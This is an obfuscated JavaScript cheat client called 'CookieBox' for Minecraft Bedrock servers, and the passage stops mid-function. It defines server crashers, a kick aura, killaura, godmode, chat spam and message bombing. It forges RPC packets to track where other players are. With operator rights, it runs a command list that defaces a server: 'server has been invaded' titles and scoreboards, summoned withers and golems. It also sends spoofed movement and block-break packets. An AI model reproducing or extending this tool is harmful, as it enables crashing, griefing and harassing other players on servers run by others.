regFun('CookieBox');
thread(() => {
  showMenu('CookieBox');
  showMenu('CookieBox/主菜单');
}, 1000);
var myId = getLocalPlayerUniqueID();
var myPos = getEntityPos(myId);
var prevPos = myPos;
var currentHealth = getEntityAttribute(myId, 'minecraft:health').current;
var prevHealth = currentHealth;
var ticks = 0;
var TP_MINER = false;
var TP_MINER_SEARCH = 60;
var TP_MINER_DELAY = 1;
var TP_MINER_NEXT = 0;
var TP_MINER_MAX = 200;
var TP_MINER_MAX_T = 0;
var TP_MINER_RANGE = 10;
var TP_MINER_PICK = 5;
var TP_MINER_RETRY = 20;
var TP_MINER_REPEAT = false;
var TP_MINER_TIMEOUT = 30;
var TP_MINER_OFFSET = false;
var TP_MINER_ANTI = false;
var TP_MINER_TP = false;
var TP_MINER_AUTO = false;
var TP_MINER_HAND = false;
var TP_MINER_DESTROY = false;
var TP_MINER_INSTANT = false;
var TP_MINER_BYPASS = false;
var TP_MINER_C_DELAY = 20;
var TP_MINER_C_DELAY_T = 0;
var TP_MINER_CHEST = false;
var TP_MINER_CHEST_S = false;
var TP_MINER_LIST = ['ore', 'log', 'chest', 'ancient_debris', 'shulker_box'];
var TP_states = [false, false];
var TP_x = -TP_MINER_RANGE;
var TP_y = -TP_MINER_RANGE;
var TP_z = -TP_MINER_RANGE;
var TP_pos = myPos;
var TP_timer = 0;
var TP_enable = true;
var TP_process = 0;
var LOCAL_RESPAWN = false;
var FAKE_IRC = false;
var SERVER_TP_states = false;
var SERVER_TP_tp = true;
var SERVER_TP_offset = 2;
var CRASHER_NEW = false;
var CRASHER_NEW_RATE = 10;
var CRASHER = false;
var CRASHER_RATE = 10;
var CRASHER_AUTH = false;
var CRASHER_AUTH_RATE = 10;
var KICKAURA = false;
var KICKAURA_RATE = 10;
var GLOBE_PACKET = false;
var GLOBE_SOUND = false;
var GLOBE_SOUND_ID = 0;
var GLOBE_SHADOW = false;
var GLOBE_ATTACK = false;
var GLOBE_EXCLUDE = true;
var GLOBE_WHITE = [];
var GLOBE_SHADOW_RANGE = 3;
var GLOBE_DELAY = 5;
var GLOBE_SHADOW_OFFSET = 2;
var GLOBE_BACKPOS = null;
var GLOBE_pos = {};
var EXPORT_POS = false;
var IMPORT_POS = false;
var IS_SUMMON = false;
var CURRENT_POS = [];
var IMPORT_DELAY = 1;
var IMPORT_SPEED = 20;
var DATA_PATH = getResource() + '/GBRC/CookieBox/建筑文件';
var POS_DATA = {
  'x': 0,
  'y': 0,
  'z': 0
};
var BUILD_TASKS = [];
var CMD_TASKS = [];
File.mkdirs(DATA_PATH);
var AUTO_CONNECT = false;
var AUTO_CONNECT_DELAY = 40;
var AUTO_CONNECT_TICK = 0;
var AUTO_CONNECT_ADDR = '';
var AUTO_TAXI = false;
var TAXI_SPEED = 5;
var TAXI_HEIGHT = 340;
var TAXI_VEC = [];
var TAXI_DIST = 0;
var TAXI_GOAL = {};
var INFINITE_PICK_RANGE = 200;
var INFINITE_PICK_MAX = 5;
var INFINITE_PICK = false;
var SHOW_CHUNK = false;
var BREAK_SHIELD = false;
var GODMODE = false;
var GODMODE_FRE = 3;
var GODMODE_RAND = false;
var GODMODE_INTERACT = false;
var GODMODE_RANGE = 1000;
var GODMODE_Y = -70;
var CRITICAL = false;
var AUTO_DESTROY = false;
var AUTO_DESTROY_RANGE = 3;
var AUTO_DESTROY_DELAY = 10;
var AUTO_DESTROY_EXCLUDE = true;
var AUTO_DESTROY_IGNORE = true;
var STRUCTURE_SCAN_RANGE = 100;
var STRUCTURE_SCAN_OFFSET = 100;
var STRUCTURE_LIST = ['village'];
var STRUCTURE_ENUM = {
  'village': '村庄',
  'mineshaft': '矿井',
  'stronghold': '要塞',
  'shipwreck': '沉船',
  'mansion': '林地府邸',
  'ocean_monument': '海底神殿',
  'pillager_outpost': '虐夺者哨塔',
  'end_city': '末地城',
  'fortress': '下界要塞'
};
var OP_SWITCH = false;
var OP_BOOST = false;
var OP_CRASH = false;
var OP_CUSTOM = false;
var OP_CONTENT = '大蛇紫菜不良';
var OP_TITLE = '大蛇紫菜不良';
var OP_SCORE = '大蛇紫菜不良';
var OP_TICKS = 0;
var OP_CMDS = ['/gamerule sendCommandFeedback false', '/gamerule commandBlockOutput false', '/scoreboard objectives remove crash_op', '/scoreboard objectives add crash_op dummy §c§l服务器已被入侵', '/scoreboard objectives setdisplay belowname crash_op', '/scoreboard objectives setdisplay list crash_op', '/scoreboard objectives setdisplay sidebar crash_op', '/playsound raid.horn @a', '/title @a times 0 99999999 0 ', '/summon wither §l§e服务器已被入侵 ~~30~', '/summon wither §l§a服务器已被入侵 ~~30~', '/summon wither §l§b服务器已被入侵 ~~30~', '/fog @a push minecraft:fog_hell llnb'];
var OP_TICKS2 = 0;
var OP_TEXTS = ['§l§a服§b务§c器§d已§e被§f入§6侵', '§l§6服§a务§b器§c已§d被§e入§f侵', '§l§f服§6务§a器§b已§c被§d入§e侵', '§l§e服§f务§6器§a已§b被§c入§d侵', '§l§d服§e务§f器§6已§a被§b入§c侵', '§l§c服§d务§e器§f已§6被§a入§b侵', '§l§b服§c务§d器§e已§f被§6入§a侵'];
var OP_TICKS3 = 0;
var OP_DELAY = 2;
var OP_DELAY2 = 0;
var OP_TICKS4 = 0;
var OP_CMDS2 = ['/summon iron_golem ~40~10~', '/summon iron_golem ~~10~40', '/summon iron_golem ~-40~10~', '/summon iron_golem ~~10~-40', '/summon iron_golem ~30~10~30', '/summon iron_golem ~-30~10~-30', '/summon iron_golem ~-30~10~30', '/summon iron_golem ~30~10~-30'];
var OP_COLORS = ['§a', '§b', '§c', '§d', '§e', '§f', '§6'];
var CHAT_MANAGER = false;
var CHAT_MANAGER_KEYWORD = ['fvv', 'L'];
var CHAT_MANAGER_TIP = false;
var KILLAURA = false;
var KILLAURA_CPS = 50;
var KILLAURA_COUNT = 1;
var KILLAURA_SELF = false;
var KILLAURA_TARGET = false;
var ANTITEXT = false;
var INFINITE_AURA = false;
var INFINITE_CPS = 3;
var INFINITE_COUNT = 3;
var INFINITE_tick = 5;
var INFINITE_tmpMot = null;
var INFINITE_tmpPos = null;
var INFINITE_SET = [];
var MSG_WHITE = [];
var MSG_NUM = 20;
var MSG_TEXT = '\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n';
var MSG_FAKE = '';
var MSG_BOOMER = false;
var SPAMMER_FAKE = true;
var SPAMMER_NUM = 1;
var SPAMMER_TEXT = 'CookieBox';
var SPAMMER_FAKE_TEXT = '';
var SPAMMER = false;
var AUTOBACK = false;
var BACK_MIN = 5;
var BACK_POS = null;
var ENCHANT_CRASHER = false;
var CLICKDESTROY = false;
var GET_COMMAND = false;
var GET_POS_STATES = false;
var GET_POS_SAVE = false;
var GET_POS_TEXT = [];
var ENTER_TEXT = false;
var ENTER_TEXT_CONTENT = 'CookieBox占领服务器';
var ENTER_TEXT_TIMES = 3;
var EXEC_CMD = false;
var EXEC_CMD_LIST = [];
var EXEC_CMD_DELAY = 10;
var EXEC_CMD_TIMES = 1;
function summonMount() {
  const Mscrt38584 = getLocalPlayerUniqueID();
  const Mscrt73456 = generateRpcHex(Mscrt38584);
  sendPyRpc(98247598, '93c40163920681c4057374617274cf0000018fb5671c15c0');
  sendPyRpc(98247598, '93c401729208c4244d696e6563726166743a7065743a74656c65706f72745f6d6f756e745f72657175657374c0');
  sendPyRpc(98247598, Mscrt73456);
}
function analysisNBT(Mscrt36109) {
  const Mscrt45506 = getText(Mscrt36109, ',Name:"', '",WasPickedUp');
  if (Mscrt45506 == '') return {
    'aux': 0,
    'namespace': 'minecraft:air',
    'count': 1
  };
  const Mscrt5558 = Number(getText(Mscrt36109, ',aux:', ','));
  const Mscrt58702 = Number(getText(Mscrt36109, 'Count:', 'b,D'));
  const Mscrt32334 = Mscrt36109.includes(',name:"') ? getText(Mscrt36109, ',name:"', '",') : Mscrt45506.replace('minecraft:', '');
  return {
    'namespace': Mscrt45506,
    'aux': Mscrt5558,
    'name': Mscrt32334,
    'count': Mscrt58702
  };
}
function generateRpcHex(Mscrt24174) {
  const Mscrt31809 = 'c4' + Mscrt24174.length.toString(16).padStart(2, '0') + stringToHex(Mscrt24174);
  let Mscrt70384 = '93c40163920881c408706c617965724964c40b2d34323934393637323935c0';
  return Mscrt70384.replace(/c40b2d34323934393637323935/, Mscrt31809);
}
function getRandColor(Mscrt14632) {
  return Mscrt14632[getRand(0, Mscrt14632.length - 1)];
}
function saveBlocksData(Mscrt87162, Mscrt34440) {
  const Mscrt76529 = JSON.stringify(Mscrt34440);
  try {
    File.write(DATA_PATH + '/' + Mscrt87162 + ' - TU.json', Mscrt76529);
  } catch (Mscrt10438) {
    messageCreater('Failed to save block data: ' + Mscrt10438);
  }
}
const MenuTP = (Mscrt11181, Mscrt86767, Mscrt41968) => {
  let Mscrt45107 = {
    'fn-set-player-pos': {
      'x': Mscrt11181,
      'y': Mscrt86767,
      'z': Mscrt41968
    }
  };
  callModule(5, JSON.stringify(Mscrt45107));
};
function loadBlocksData(Mscrt8616) {
  try {
    summonServerMob(POS_DATA.x, POS_DATA.y, POS_DATA.z);
    const Mscrt35636 = File.read(DATA_PATH + '/' + Mscrt8616);
    CURRENT_POS = [POS_DATA.x, POS_DATA.y, POS_DATA.z];
    return JSON.parse(Mscrt35636);
  } catch (Mscrt45253) {
    messageCreater('Failed to load block data: ' + Mscrt45253);
    return null;
  }
}
const getDistance = (Mscrt81247, Mscrt33145) => Math.sqrt(Math.pow(Mscrt81247.x - Mscrt33145.x, 2) + Math.pow(Mscrt81247.y - Mscrt33145.y, 2) + Math.pow(Mscrt81247.z - Mscrt33145.z, 2));
function getChunkBlocks(Mscrt42400, Mscrt58567, Mscrt24554, Mscrt41574, Mscrt26626, Mscrt3829) {
  const Mscrt32065 = Math.min(Mscrt42400, Mscrt41574);
  const Mscrt41320 = Math.min(Mscrt58567, Mscrt26626);
  const Mscrt71158 = Math.min(Mscrt24554, Mscrt3829);
  const Mscrt68504 = Math.max(Mscrt42400, Mscrt41574);
  const Mscrt84973 = Math.max(Mscrt58567, Mscrt26626);
  const Mscrt44763 = Math.max(Mscrt24554, Mscrt3829);
  const Mscrt49562 = [];
  for (let Mscrt62505 = Mscrt32065; Mscrt62505 <= Mscrt68504; Mscrt62505++) {
    for (let Mscrt88014 = Mscrt41320; Mscrt88014 <= Mscrt84973; Mscrt88014++) {
      for (let Mscrt56656 = Mscrt71158; Mscrt56656 <= Mscrt44763; Mscrt56656++) {
        const Mscrt48484 = getBlock(Mscrt62505, Mscrt88014, Mscrt56656);
        if (Mscrt48484.id === 0 || Mscrt48484.namespace === 'minecraft:air') {
          continue;
        }
        let Mscrt76275 = {
          'name': Mscrt48484.namespace,
          'aux': Mscrt48484.aux,
          'x': Mscrt62505 - Mscrt32065,
          'y': Mscrt88014 - Mscrt41320,
          'z': Mscrt56656 - Mscrt71158
        };
        if (Mscrt48484.namespace.includes('_command')) {
          let Mscrt44893 = getBlockNBT(Mscrt62505, Mscrt88014, Mscrt56656);
          let Mscrt10973 = getBlockEntityNBT(Mscrt62505, Mscrt88014, Mscrt56656);
          let Mscrt11355 = 'Tick';
          if (Mscrt48484.namespace.includes('chain')) Mscrt11355 = 'Chain';
          if (Mscrt48484.namespace.includes('repeat')) Mscrt11355 = 'Repeating';
          Mscrt76275.cmd = {
            'mode': Mscrt11355,
            'auto': getText(Mscrt10973, 'auto:', 'b,c') == '1',
            'condition': getText(Mscrt44893, 'conditional_bit:', 'b,f') == '1',
            'cmd': getText(Mscrt10973, 'Command:"', '",Cu'),
            'name': getText(Mscrt10973, 'CustomName:"', '",E'),
            'delay': Number(getText(Mscrt10973, 'TickDelay:', ',Tr'))
          };
        }
        Mscrt49562.push(Mscrt76275);
      }
    }
  }
  return Mscrt49562;
}
const packetDestroy = (Mscrt48516, Mscrt51274, Mscrt56611, Mscrt41939 = false, Mscrt65438 = false, Mscrt71542 = false) => {
  let Mscrt87797 = {
    'x': Mscrt48516,
    'y': Mscrt51274,
    'z': Mscrt56611
  };
  let Mscrt33903 = Mscrt71542 ? 10 : 1;
  const Mscrt23330 = [0, 13, 18, 27];
  const Mscrt58314 = Mscrt28288 => sendPlayerAuthInput({
    'pos': myPos,
    'inputMode': 2,
    'playMode': 0,
    'flags': [35],
    'actions': Mscrt28288.map(Mscrt49262 => ({
      'type': Mscrt49262,
      'pos': Mscrt87797,
      'value': 1
    }))
  });
  const Mscrt19706 = Mscrt41602 => sendPlayerAction({
    'id': myId,
    'pos': Mscrt87797,
    'type': Mscrt41602
  });
  for (let Mscrt42263 = 0; Mscrt42263 < Mscrt33903; Mscrt42263++) {
    if (Mscrt41939) Mscrt58314(Mscrt23330);
    if (Mscrt65438) Mscrt23330.forEach(Mscrt48321 => Mscrt19706(Mscrt48321));
  }
};
function getText(Mscrt18152, Mscrt90007, Mscrt28640) {
  let Mscrt82153 = Mscrt18152.indexOf(Mscrt90007) + Mscrt90007.length;
  let Mscrt3114 = Mscrt18152.indexOf(Mscrt28640, Mscrt82153);
  return Mscrt18152.substring(Mscrt82153, Mscrt3114);
}
function showListMenu() {
  const Mscrt16597 = {
    'type': 'form',
    'title': '建筑列表',
    'content': '请选择需要粘贴的建筑',
    'buttons': []
  };
  const Mscrt59098 = File.list(DATA_PATH);
  if (!Mscrt59098 || Mscrt59098.length === 0) {
    Mscrt16597.buttons.push({
      'text': '暂无数据'
    });
  } else {
    Mscrt59098.forEach(Mscrt24721 => {
      Mscrt16597.buttons.push({
        'text': Mscrt24721.name.replace('.json', ''),
        'image': {
          'type': 'path',
          'data': 'textures/ui/default_world.png'
        }
      });
    });
  }
  addForm(JSON.stringify(Mscrt16597), (Mscrt83916) => {
    if (Mscrt83916 >= 0 && Mscrt59098 && Mscrt59098.length > Mscrt83916) {
      IS_SUMMON = false;
      CMD_TASKS = [];
      executeCommand('tickingarea remove CookieBox true');
      const Mscrt80993 = loadBlocksData(Mscrt59098[Mscrt83916]['name']);
      messageCreater(Mscrt80993 ? '读取成功' : '读取失败');
      if (Mscrt80993) BUILD_TASKS = Mscrt80993;
    }
  });
}
const ab2str = Mscrt16342 => {
  try {
    const Mscrt7449 = new Uint8Array(Mscrt16342);
    let Mscrt70106 = '';
    for (let Mscrt1906 = 0; Mscrt1906 < Mscrt7449.length;) {
      let Mscrt83049 = Mscrt7449[Mscrt1906++];
      if (Mscrt83049 <= 127) Mscrt70106 += String.fromCharCode(Mscrt83049);else if (Mscrt83049 >> 5 === 6) {
        let Mscrt39661 = Mscrt7449[Mscrt1906++];
        Mscrt70106 += String.fromCharCode((Mscrt83049 & 31) << 6 | Mscrt39661 & 63);
      } else if (Mscrt83049 >> 4 === 14) {
        let Mscrt83631 = Mscrt7449[Mscrt1906++];
        let Mscrt68623 = Mscrt7449[Mscrt1906++];
        Mscrt70106 += String.fromCharCode((Mscrt83049 & 15) << 12 | (Mscrt83631 & 63) << 6 | Mscrt68623 & 63);
      } else if (Mscrt83049 >> 3 === 30) {
        let Mscrt46757 = Mscrt7449[Mscrt1906++];
        let Mscrt63717 = Mscrt7449[Mscrt1906++];
        let Mscrt43690 = Mscrt7449[Mscrt1906++];
        let Mscrt24886 = (Mscrt83049 & 7) << 18 | (Mscrt46757 & 63) << 12 | (Mscrt63717 & 63) << 6 | Mscrt43690 & 63;
        Mscrt70106 += String.fromCodePoint(Mscrt24886);
      }
    }
    return Mscrt70106;
  } catch (Mscrt48555) {
    clientMessage(Mscrt48555.stack, Mscrt16342);
  }
};
const getRand = (Mscrt45538, Mscrt38431) => {
  const Mscrt48765 = Mscrt38431 - Mscrt45538 + 1;
  return Math.floor(Math.random() * Mscrt48765) + Mscrt45538;
};
const messageCreater = Mscrt58579 => clientMessage('§bCookieBox§7 §7>>> §rTip §7>>> §r' + Mscrt58579);
const tipCreater = Mscrt9532 => showTipMessage('§bCookieBox§7>>> §rTip §7>>> §r' + Mscrt9532);
const silentMove = (Mscrt34020, Mscrt79348, Mscrt13055, Mscrt71755 = {
  'x': 0,
  'y': 0,
  'z': 0
}) => sendPlayerAuthInput({
  'pos': {
    'x': Mscrt34020,
    'y': Mscrt79348,
    'z': Mscrt13055
  },
  'yHeadRot': 0,
  'inputMode': 2,
  'playMode': 0,
  'flags': [6],
  'motion': Mscrt71755,
  'rot': {
    'yaw': 0,
    'pitch': 0
  }
});
const summonServerMob = (Mscrt64802, Mscrt79696, Mscrt74076) => {
  const Mscrt76381 = Mscrt79696 - 5;
  let Mscrt67222 = {
    'mode': 'Repeating',
    'isRedStoneMode': false,
    'isConditional': false,
    'command': 'execute as @e[type=armor_stand,name="CookieBox"] at @s run tp ~ ~ ~',
    'name': 'TU导入命令方块',
    'tickDelay': 0,
    'executeOnFirstTick': true,
    'shouldTrackOutput': false,
    'lastOutput': 'CookieBox'
  };
  executeCommand('kill @e[type=armor_stand,name="CookieBox"]');
  executeCommand('setblock ' + Mscrt64802 + ' ' + Math.max(-63, Mscrt76381) + ' ' + Mscrt74076 + ' command_block');
  setTimeout(() => setCommandBlockData(Mscrt64802, Math.max(-63, Mscrt76381), Mscrt74076, Mscrt67222), 250);
  setTimeout(() => executeCommand('summon armor_stand CookieBox ' + Mscrt64802 + ' ' + Mscrt79696 + ' ' + Mscrt74076), 350);
  setTimeout(() => {
    executeCommand('effect @e[type=armor_stand,name="CookieBox"] fire_resistance 114514 255 true');
    executeCommand('effect @e[type=armor_stand,name="CookieBox"] instant_health 114514 255 true');
    executeCommand('effect @e[type=armor_stand,name="CookieBox"] resistance 114514 255 true');
    executeCommand('effect @e[type=armor_stand,name="CookieBox"] slow_falling 114514 255 true');
    executeCommand('effect @e[type=armor_stand,name="CookieBox"] absorption 114514 255 true');
    executeCommand('tickingarea add ' + Mscrt64802 + ' ' + Math.max(-63, Mscrt76381) + ' ' + Mscrt74076 + ' ' + Mscrt64802 + ' ' + Math.max(-63, Mscrt76381) + ' ' + Mscrt74076 + ' CookieBox true');
    IS_SUMMON = true;
  }, 500);
};
function extractPlayerIdHex(Mscrt11377) {
  const Mscrt78157 = Mscrt11377.indexOf('706f734d6170');
  if (Mscrt78157 === -1) return null;
  let Mscrt11077 = Mscrt78157 + 12;
  Mscrt11077 += 2;
  const Mscrt70516 = Mscrt11377.substr(Mscrt11077, 2);
  Mscrt11077 += 2;
  let Mscrt32691;
  if (Mscrt70516 === 'c4') {
    Mscrt32691 = parseInt(Mscrt11377.substr(Mscrt11077, 2), 16);
    Mscrt11077 += 2;
  } else if (Mscrt70516 === 'c5') {
    Mscrt32691 = parseInt(Mscrt11377.substr(Mscrt11077, 4), 16);
    Mscrt11077 += 4;
  } else if (Mscrt70516 === 'c6') {
    Mscrt32691 = parseInt(Mscrt11377.substr(Mscrt11077, 8), 16);
    Mscrt11077 += 8;
  } else if (Mscrt70516 >= 'a0' && Mscrt70516 <= 'bf') Mscrt32691 = parseInt(Mscrt70516, 16) - 160;else return null;
  const Mscrt20592 = Mscrt32691 * 2;
  const Mscrt44102 = Mscrt11377.substr(Mscrt11077, Mscrt20592);
  return Mscrt44102;
}
const sendShadow = (Mscrt28335, Mscrt44687, Mscrt67836, Mscrt14280 = myId) => sendPlayerAction({
  'id': Mscrt14280,
  'pos': {
    'x': Mscrt28335,
    'y': Mscrt44687,
    'z': Mscrt67836
  },
  'type': 17
});
function calHexPos(Mscrt26041) {
  function Mscrt53254(Mscrt75092) {
    if (Mscrt75092.length !== 16) throw new Error('Hex data must be 16 characters');
    const Mscrt41142 = new Uint8Array(8);
    for (let Mscrt72054 = 0; Mscrt72054 < 8; Mscrt72054++) Mscrt41142[Mscrt72054] = parseInt(Mscrt75092.substring(Mscrt72054 * 2, Mscrt72054 * 2 + 2), 16);
    const Mscrt14527 = new DataView(Mscrt41142.buffer);
    return Mscrt14527.getFloat64(0, false);
  }
  const Mscrt47253 = '76616c7565';
  const Mscrt7197 = Mscrt26041.indexOf(Mscrt47253);
  if (Mscrt7197 === -1) throw new Error('Value key not found in hex string');
  let Mscrt62260 = Mscrt7197 + Mscrt47253.length;
  const Mscrt70826 = Mscrt26041.substring(Mscrt62260, Mscrt62260 + 2);
  if (Mscrt70826 !== '93') throw new Error('Expected array tag \'93\' after value key');
  Mscrt62260 += 2;
  const Mscrt48795 = [];
  for (let Mscrt43837 = 0; Mscrt43837 < 3; Mscrt43837++) {
    const Mscrt85777 = Mscrt26041.substring(Mscrt62260, Mscrt62260 + 2);
    if (Mscrt85777 !== 'cb') throw new Error('Expected float64 tag \'cb\' at position ' + Mscrt62260 + ', found ' + Mscrt85777);
    Mscrt62260 += 2;
    const Mscrt16477 = Mscrt26041.substring(Mscrt62260, Mscrt62260 + 16);
    Mscrt62260 += 16;
    const Mscrt51587 = Mscrt53254(Mscrt16477);
    Mscrt48795.push(Mscrt51587);
  }
  return {
    'x': Number(Mscrt48795[0]['toFixed'](2)),
    'y': Number(Mscrt48795[1]['toFixed'](2)),
    'z': Number(Mscrt48795[2]['toFixed'](2))
  };
}
const stringToHex = Mscrt16751 => {
  let Mscrt16216 = '';
  for (let Mscrt73731 = 0; Mscrt73731 < Mscrt16751.length; Mscrt73731++) Mscrt16216 += Mscrt16751.charCodeAt(Mscrt73731).toString(16).padStart(2, '0');
  return Mscrt16216;
};
const hex2u8a = Mscrt18199 => {
  if (Mscrt18199.startsWith('0x')) Mscrt18199 = Mscrt18199.slice(2);
  const Mscrt40455 = [];
  for (let Mscrt88273 = 0; Mscrt88273 < Mscrt18199.length; Mscrt88273 += 2) {
    const Mscrt62183 = parseInt(Mscrt18199.slice(Mscrt88273, Mscrt88273 + 2), 16);
    Mscrt40455.push(Mscrt62183);
  }
  return new Uint8Array(Mscrt40455);
};
const hex2str = Mscrt31731 => {
  let Mscrt51091 = '';
  for (let Mscrt5043 = 0; Mscrt5043 < Mscrt31731.length; Mscrt5043 += 2) {
    Mscrt51091 += String.fromCharCode(parseInt(Mscrt31731.substr(Mscrt5043, 2), 16));
  }
  return Mscrt51091;
};
const sendPyRpc = (Mscrt50413, Mscrt33791) => sendRpc(Mscrt50413, hex2u8a(Mscrt33791));
const sendPlayerPos = Mscrt67857 => {
  sendPyRpc(98247598, '93c401729200c4314d696e6563726166743a7065743a7065745f736b696c6c5f667269656e645f6332735f6765745f667269656e645f706f73c0');
  sendPyRpc(98247598, '93c40163920082c407706c617965727391c4' + Mscrt67857.length.toString(16).toLowerCase().padStart(2, '0') + stringToHex(Mscrt67857) + 'c40b726571506c617965724964c4' + myId.length.toString(16).toLowerCase().padStart(2, '0') + stringToHex(myId) + 'c0');
};
const createUI = (Mscrt44134, Mscrt83033, Mscrt80930) => loadMenu(Mscrt44134, JSON.stringify({
  'type': 'Menu',
  'title': {
    'name': '『' + Mscrt83033 + '』',
    'size': 12,
    'elevation': 3,
    'background': '$menu_title_background_color',
    'padding': [5, 4, 5, 4],
    'colors': ['$menu_title_gradient_text_begin_color', '$menu_title_gradient_text_end_color']
  },
  'color': '$menu_color',
  'alpha': 0.9,
  'can_close': true,
  'hide_fun': false,
  'items': [{
    'type': 'TextView',
    'name': Mscrt83033,
    'color': '$menu_item_color',
    'size': 13,
    'padding': [5, 5, 5, 5],
    'tag': 'CookieBox',
    'items': Mscrt80930
  }]
}));
function onCallModuleEvent(Mscrt41254) {
  if (!Mscrt41254 || !Mscrt41254.fun || Mscrt41254.fun !== 'CookieBox') return;
  if (Mscrt41254.key !== undefined) {
    const Mscrt43029 = Mscrt41254.key;
    if (Mscrt43029 === 'SAVE_HOTBAR') {
      const Mscrt64425 = '{"type":"custom_form","title":"导出快捷栏","content":[{"type":"input","text":"§b名称:","default":"快捷栏预设-' + Date.now() + '"}]}';
      addForm(Mscrt64425, (Mscrt31198) => {
        let Mscrt56823 = [];
        for (let Mscrt60204 = 0; Mscrt60204 < 9; Mscrt60204++) Mscrt56823.push(analysisNBT(getPlayerInventoryItem(myId, Mscrt60204)));
        File.write(getResource('/GBRC/CookieBox/' + Mscrt31198 + '.json'), JSON.stringify(Mscrt56823));
        messageCreater('保存成功');
      });
    }
    if (Mscrt43029 == 'LOAD_HOTBAR') {
      const Mscrt50764 = {
        'type': 'form',
        'title': '快捷栏预设',
        'content': '选择要加载的预设',
        'buttons': [{
          'text': '没有预设'
        }]
      };
      const Mscrt24975 = File.list(getResource('/GBRC/CookieBox'));
      for (let Mscrt4459 = 0; Mscrt4459 < Mscrt24975.length; Mscrt4459++) {
        Mscrt50764.buttons[Mscrt4459] = {
          'text': Mscrt24975[Mscrt4459]['name'],
          'image': {
            'type': 'path',
            'data': 'textures/ui/gear.png'
          }
        };
      }
      const Mscrt82144 = JSON.stringify(Mscrt50764);
      addForm(Mscrt82144, (Mscrt56684) => {
        if (Mscrt24975.length > 0 && Mscrt56684 >= 0) {
          let Mscrt50187 = JSON.parse(File.read(Mscrt24975[Mscrt56684]['path']));
          Mscrt50187.forEach((Mscrt9564, Mscrt54451) => sendCommandRequest('replaceitem entity @s slot.hotbar ' + Mscrt54451 + ' ' + Mscrt9564.namespace + ' ' + Mscrt9564.count + ' ' + Mscrt9564.aux));
          messageCreater('加载预设' + Mscrt24975[Mscrt56684]['name'] + '成功');
        }
      });
    }
    if (Mscrt43029 == 'OP_EXIT') leaveWorld();
    if (Mscrt43029 == 'OP_CLEAR') {
      executeCommand('/scoreboard objectives remove crash_op');
      executeCommand('/title @a title §e');
      executeCommand('/title @a subtitle §e');
      executeCommand('/fog @a remove llnb');
      executeCommand('/kill @e[type=wither]');
      executeCommand('/kill @e[type=Ender_Dragon]');
      executeCommand('/kill @e[type=iron_golem]');
    }
    if (Mscrt43029.includes('player:')) {
      let Mscrt37528 = Mscrt43029.replace('player:', '');
      messageCreater('查询玩家坐标中...');
      sendPlayerPos(Mscrt37528);
      SERVER_TP_states = true;
    }
    if (Mscrt43029.includes('pos:')) {
      let Mscrt20877 = JSON.parse(Mscrt43029.replace('pos:', ''));
      messageCreater('已传送');
      setEntityPos(myId, Mscrt20877.x, Mscrt20877.y, Mscrt20877.z);
    }
    if (Mscrt43029 === 'IMPORT_BUILD') showListMenu();
    if (Mscrt43029 === 'GET_POS') {
      getWorldPlayerList().forEach(Mscrt42000 => {
        if (Mscrt42000.id === myId) return;
        sendPlayerPos(Mscrt42000.id);
      });
      GET_POS_STATES = true;
      GET_POS_TEXT = [];
    }
    if (Mscrt43029 === 'BACK_SET') {
      BACK_SET = getEntityPos(myId);
      messageCreater('已设置主城坐标为当前坐标');
    }
    if (Mscrt43029 === 'SERVER_TP') {
      thread(() => removeMenu('PlayerList'), 50);
      thread(() => {
        createUI('PlayerList', '玩家传送', getWorldPlayerList().map(Mscrt15732 => ({
          'name': Mscrt15732.name,
          'type': 'TextView',
          'color': '$menu_item_color',
          'size': 10,
          'padding': [5, 5, 5, 5],
          'key': 'player:' + Mscrt15732.id
        })));
      }, 100);
      messageCreater('已打开玩家列表');
    }
    if (Mscrt43029 === 'STRUCTURE_SCAN') {
      let Mscrt84375 = [];
      let Mscrt38090 = [];
      STRUCTURE_LIST.forEach(Mscrt43063 => {
        for (let Mscrt6092 = -STRUCTURE_SCAN_RANGE / 2; Mscrt6092 < STRUCTURE_SCAN_RANGE / 2; Mscrt6092++) {
          for (let Mscrt86110 = -STRUCTURE_SCAN_RANGE / 2; Mscrt86110 < STRUCTURE_SCAN_RANGE / 2; Mscrt86110++) {
            let Mscrt2452 = {
              'x': myPos.x + Mscrt6092 * STRUCTURE_SCAN_OFFSET,
              'y': myPos.y,
              'z': myPos.z + Mscrt86110 * STRUCTURE_SCAN_OFFSET
            };
            let Mscrt80421 = findStructure(Mscrt2452.x, Mscrt2452.y, Mscrt2452.z, Mscrt43063);
            if (!Mscrt80421.state) continue;
            let Mscrt46418 = JSON.stringify(Mscrt80421);
            if (Mscrt38090.includes(Mscrt46418)) continue;else Mscrt38090.push(Mscrt46418);
            Mscrt84375.push({
              'name': STRUCTURE_ENUM[Mscrt43063] + ('\n坐标: ' + Mscrt80421.x + ' ' + Mscrt80421.y + ' ' + Mscrt80421.z),
              'type': 'TextView',
              'color': '$menu_item_color',
              'size': 10,
              'padding': [5, 5, 5, 5],
              'key': 'pos:' + Mscrt46418
            });
          }
        }
      });
      thread(() => removeMenu('Structure'), 50);
      thread(() => {
        createUI('Structure', '结构列表', Mscrt84375);
      }, 100);
      messageCreater('已打开结构列表');
    }
    if (Mscrt43029 === 'GLOBE_SET') {
      thread(() => removeMenu('WhiteList'), 50);
      thread(() => {
        createUI('WhiteList', '玩家白名单', getWorldPlayerList().map(Mscrt44073 => ({
          'name': Mscrt44073.name,
          'type': 'CheckBox',
          'color': '$menu_item_color',
          'size': 10,
          'checked': GLOBE_WHITE.includes(Mscrt44073.id),
          'padding': [5, 5, 5, 5],
          'key': 'white:' + Mscrt44073.id
        })));
      }, 100);
      messageCreater('已打开玩家列表');
    }
    if (Mscrt43029 === 'INFINITE_SET') {
      thread(() => removeMenu('WhiteList'), 50);
      thread(() => {
        createUI('WhiteList', '玩家白名单', getWorldPlayerList().map(Mscrt52840 => ({
          'name': Mscrt52840.name,
          'type': 'CheckBox',
          'color': '$menu_item_color',
          'size': 10,
          'checked': INFINITE_SET.includes(Mscrt52840.id),
          'padding': [5, 5, 5, 5],
          'key': 'ia_white:' + Mscrt52840.id
        })));
      }, 100);
      messageCreater('已打开玩家列表');
    }
    if (Mscrt43029 === 'MSG_WHITE') {
      thread(() => removeMenu('BlackList'), 50);
      thread(() => {
        createUI('BlackList', '玩家黑名单', getWorldPlayerList().map(Mscrt55887 => ({
          'name': Mscrt55887.name,
          'type': 'CheckBox',
          'color': '$menu_item_color',
          'size': 10,
          'checked': MSG_WHITE.includes(Mscrt55887.id),
          'padding': [5, 5, 5, 5],
          'key': 'msg_black:' + Mscrt55887.id
        })));
      }, 100);
